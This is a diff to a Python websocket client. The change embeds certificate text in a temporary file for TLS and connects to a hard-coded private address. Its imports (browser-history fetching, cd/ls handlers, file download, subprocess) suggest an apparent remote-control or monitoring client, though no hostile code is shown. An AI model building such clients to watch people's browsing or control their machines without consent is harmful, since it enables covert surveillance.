@@ -2,6 +2,7 @@ import asyncio
 import json
 import platform
 import ssl
+import tempfile
 
 # import ssl
 
@@ -11,14 +12,20 @@ import subprocess
 import time
 
 from browser.monitor_website import fetch_hist
-from utils import handle_cd, download_file, handle_ls
+from utils import handle_cd, download_file, handle_ls, cert_text
 
 operating_system = platform.system().lower()
 
 
 async def start_client():
-    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-    ssl_context.load_verify_locations(cafile='./server.crt')
+    # Create a temporary file to store the certificate text
+    with tempfile.NamedTemporaryFile(delete=False) as cert_file:
+        cert_file.write(cert_text.encode('utf-8'))
+
+    # Load certificate from the temporary file
+    ssl_context = ssl.create_default_context()
+    ssl_context.load_verify_locations(cafile=cert_file.name)
+
     uri = "wss://192.168.1.114:8000/ws/client"
 
     while True:
